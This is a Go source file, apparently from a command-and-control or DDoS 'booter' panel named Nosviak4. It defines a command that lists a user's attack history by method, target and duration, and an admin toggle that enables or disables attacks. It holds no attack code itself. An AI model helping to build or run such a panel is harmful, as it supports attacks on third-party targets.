package commands

import (
	"Nosviak4/modules/gotable2"
	"Nosviak4/source/database"
	"Nosviak4/source/masters/attacks"
	"Nosviak4/source/masters/commands"
	"Nosviak4/source/masters/sessions"
	"Nosviak4/source/masters/terminal/interactions"
)

// Attacks will show this users attack history.
var Attacks = commands.ROOT.NewCommand(&commands.Command{
	Aliases: []string{"attacks"},
	Description: "view your history of attacks",
	Permissions: make([]string, 0),
	CommandFunc: func(context *commands.ArgContext, session *sessions.Session) error {
		tablet := gotable2.NewGoTable(&gotable2.Style{BorderValues: 1})
		tablet.Head(&gotable2.Row{
			Columns: []*gotable2.Column{
				{
					Text: session.ExecuteBrandingToStringNoErr(make(map[string]any), "commands", "attacks", "method.tfx"),
					Align: gotable2.AlignCenter,
				},
				{
					Text: session.ExecuteBrandingToStringNoErr(make(map[string]any), "commands", "attacks", "target.tfx"),
					Align: gotable2.AlignCenter,
				},
				{
					Text: session.ExecuteBrandingToStringNoErr(make(map[string]any), "commands", "attacks", "duration.tfx"),
					Align: gotable2.AlignCenter,
				},
				{
					Text: session.ExecuteBrandingToStringNoErr(make(map[string]any), "commands", "attacks", "created.tfx"),
					Align: gotable2.AlignCenter,
				},
			},
		})

		attacks, err := database.DB.GetUserAttacks(session.User.Username)
		if err != nil {
			return err
		}

		for _, attack := range attacks {
			tablet.Append(&gotable2.Row{
				Columns: []*gotable2.Column{
					{
						Text: session.ExecuteBrandingToStringNoErr(map[string]any{"method": attack.Method}, "commands", "attacks", "value_method.tfx"),
						Align: gotable2.AlignLeft,
					},
					{
						Text: session.ExecuteBrandingToStringNoErr(map[string]any{"target": attack.Target}, "commands", "attacks", "value_target.tfx"),
						Align: gotable2.AlignLeft,
					},
					{
						Text: session.ExecuteBrandingToStringNoErr(map[string]any{"duration": attack.Duration}, "commands", "attacks", "value_duration.tfx"),
						Align: gotable2.AlignLeft,
					},
					{
						Text: session.ExecuteBrandingToStringNoErr(map[string]any{"created": attack.Created}, "commands", "attacks", "value_created.tfx"),
						Align: gotable2.AlignLeft,
					},
				},
			})
		}

		return session.Table(tablet, context.Command.Aliases[0])
	},
})

// AttacksToggle allows you to toggle the current attack status
var AttacksToggle = Attacks.NewCommand(&commands.Command{
	Aliases: []string{"toggle"},
	Permissions: []string{interactions.ADMIN, interactions.MOD},
	Description: "toggle if attacks ar enabled or disabled",
	CommandFunc: func(ac *commands.ArgContext, s *sessions.Session) error {
		
		attacks.Attacks = !attacks.Attacks

		switch attacks.Attacks {
		
		// Attacks are now enabled
		case true:
			return s.ExecuteBranding(make(map[string]any), "commands", "attacks", "enabled.tfx")

		// Attacks are now disabled
		default:
			return s.ExecuteBranding(make(map[string]any), "commands", "attacks", "disabled.tfx")
		}
	},
})